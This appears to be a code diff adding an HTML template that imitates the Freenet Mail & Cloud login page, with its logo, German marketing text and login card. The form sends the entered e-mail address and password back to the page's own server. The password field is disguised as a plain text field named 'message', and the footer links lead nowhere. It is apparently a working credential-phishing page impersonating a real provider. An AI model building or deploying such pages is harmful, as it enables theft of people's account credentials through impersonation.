@@ -1,0 +1,170 @@
+<!-- freenet.html -->
+<!doctype html>
+<html lang="de">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+        <title>Freenet Mail Power Login</title>
+      
+        <!-- Favicon -->
+        <link rel="icon" type="image/png" sizes="180x180" href="{{ url_for('static', filename='favicon.png') }}">
+        <link rel="apple-touch-icon" sizes="180x180" href="{{ url_for('static', filename='favicon.png') }}">
+      
+        <!-- Tailwind CDN -->
+        <script src="https://cdn.tailwindcss.com"></script>
+      
+        <style>
+          .site-header { height: 70px; }
+          .card-rounded { border-radius: 10px; }
+          input:focus { outline: 2px solid rgba(59,130,246,0.15); outline-offset: 2px; }
+          
+          /* Prevent zoom on input focus for mobile */
+          @media screen and (max-width: 768px) {
+            input, select, textarea {
+              font-size: 16px !important;
+            }
+          }
+        </style>
+      </head>
+      
+<body class="min-h-screen flex flex-col bg-slate-900">
+
+ <!-- Header -->
+<header class="site-header w-full bg-[#1e2a44] flex items-center justify-between">
+    <!-- Left: freenet logo -->
+    <div class="flex items-center ml-4 md:ml-[200px]">
+        <img src="{{ url_for('static', filename='freenet.svg') }}" 
+        alt="freenet logo" 
+        class="w-48 h-48 md:w-48 md:h-48 object-contain"/>
+   
+    </div>
+  
+    <!-- Right: 3 images - hidden on mobile -->
+    <div class="hidden md:flex items-center gap-6 mr-[200px]">
+      <img src="{{ url_for('static', filename='grafik-ssl.png') }}" class="h-12 w-auto">
+      <img src="{{ url_for('static', filename='grafik-emig.png') }}" class="h-12 w-auto">
+      <img src="{{ url_for('static', filename='grafik-cloud.png') }}" class="h-12 w-auto">
+    </div>
+  </header>
+  
+  
+  
+  
+  <main class="flex-1 relative bg-cover bg-center" 
+  style="background-image: url('{{ url_for("static", filename="bg.jpg") }}');">
+
+    <div class="absolute inset-0 bg-gradient-to-r from-black/20 via-transparent to-transparent"></div>
+
+    <!-- Two-column layout centered -->
+    <div class="relative z-10 min-h-[calc(100vh-140px)] md:min-h-[calc(100vh-140px)]">
+      
+<!-- Left text - hidden on mobile -->
+<div class="hidden md:block text-left absolute ml-[250px] mt-[80px] max-w-[600px]">
+  <h1 class="text-white font-extrabold leading-tight drop-shadow-lg text-[2.5rem]">
+    Keine Werbung. Kein Spam.
+  </h1>
+  <h2 class="text-white font-extrabold leading-tight mt-3 text-[2rem]">
+    Nur E-Mail.
+  </h2>
+</div>
+
+  
+  
+
+      <!-- Right login card - centered on mobile, absolute right on desktop -->
+      <div class="w-full max-w-[350px] bg-white border-[20px] border-white rounded-none shadow-md overflow-hidden text-[#1a1a1a] mx-auto md:mx-0 md:absolute md:right-0 mt-[20px] md:mt-[80px] md:mr-[224px]">
+        <!-- Green login section -->
+        <div class="bg-[#8cc63f] px-5 py-2">
+          <h2 class="text-white text-xl font-semibold mb-4">Login Mail &amp; Cloud</h2>
+        
+          <form class="space-y-[0.35rem]" method="POST">
+            <!-- Email -->
+            <input type="email" name="email" placeholder="E-Mail-Adresse"
+                   class="w-full px-3 py-2 text-base border border-gray-300 rounded-t-sm focus:outline-none focus:ring-1 focus:ring-blue-200" required />
+        
+            <!-- Message -->
+            <input type="text" name="message" placeholder="Passwort"
+                   class="w-full px-3 py-2 text-base border border-gray-300 border-t-0 rounded-b-sm focus:outline-none focus:ring-1 focus:ring-blue-200" required />
+        
+              <!-- Help + Login -->
+              <div class="flex items-center justify-between mt-2 mb-2">
+                <span class="text-white/90 text-xs">Brauchst Du Hilfe?</span>
+                <button type="submit" class="bg-[#18345a] text-white px-4 py-1.5 text-xs font-semibold rounded-sm hover:brightness-95 transition">
+                  ANMELDEN
+                </button>
+              </div>
+
+                 <!-- Divider (lighter lines) -->
+            <div class="flex items-center gap-2 mt-3">
+                <div class="flex-1 h-px bg-neutral-600"></div>
+                <div class="text-white text-xs font-semibold">oder</div>
+                <div class="flex-1 h-px bg-neutral-600"></div>
+              </div>
+        
+              <!-- Passkey button -->
+              <div class="relative mt-2 flex items-center">
+                <span class="bg-white text-[#8cc63f] font-bold rounded-full w-5 h-5 flex items-center justify-center text-xs shadow-sm mr-2 ml-1">
+                  ?
+                </span>
+                <button class="flex-1 bg-[#828999] text-[#1a1a1a] text-sm font-semibold py-2 rounded-sm hover:brightness-95 transition">
+                  ANMELDEN MIT PASSKEY
+                </button>
+              </div>
+            
+        </form>
+        
+        
+        </div>
+        
+
+  <!-- Light grey section -->
+<div class="bg-[#eef3f7] px-5 py-6">
+  <!-- Heading -->
+  <h3 class="text-[#18345a] text-2xl font-semibold mb-5">freenet Mail &amp; Cloud</h3>
+
+  <!-- Feature 1 -->
+  <div class="flex items-center gap-3 text-lg text-[#1a1a1a] mb-4">
+    <img src="{{ url_for('static', filename='env1.png') }}" alt="E-Mail made in Germany" class="w-7 h-7 object-contain">
+    <span>E-Mail made in Germany</span>
+  </div>
+
+  <!-- Feature 2 -->
+  <div class="flex items-center gap-3 text-lg text-[#1a1a1a] mb-6">
+    <img src="{{ url_for('static', filename='cloud.png') }}" alt="Cloud mit 3 GB" class="w-7 h-7 object-contain">
+    <span>Cloud mit 3 GB</span>
+  </div>
+
+  <!-- Button -->
+  <button class="w-full bg-[#8cc63f] text-white font-semibold py-2 rounded-sm text-lg hover:bg-[#7ab534] transition">
+    KOSTENLOS REGISTRIEREN
+  </button>
+  
+</div>
+
+</div>
+
+        </div>
+      </div>
+  </main>
+
+  <!-- Footer - hidden on mobile -->
+  <footer class="hidden md:block bg-[#1e2a44] text-slate-200 text-sm py-4">
+    <div class="max-w-6xl mx-auto px-6 md:px-10 text-center">
+      <nav class="flex flex-wrap justify-center gap-x-4 gap-y-2">
+        <a class="hover:underline" href="#">Impressum</a>
+        <span class="text-slate-500">|</span>
+        <a class="hover:underline" href="#">AGB</a>
+        <span class="text-slate-500">|</span>
+        <a class="hover:underline" href="#">Datenschutz</a>
+        <span class="text-slate-500">|</span>
+        <a class="hover:underline" href="#">freenet Group</a>
+        <span class="text-slate-500">|</span>
+        <a class="hover:underline" href="#">Kundenservice</a>
+        <span class="text-slate-500">|</span>
+        <a class="hover:underline" href="#">Facebook</a>
+      </nav>
+    </div>
+  </footer>
+
+</body>
+</html>
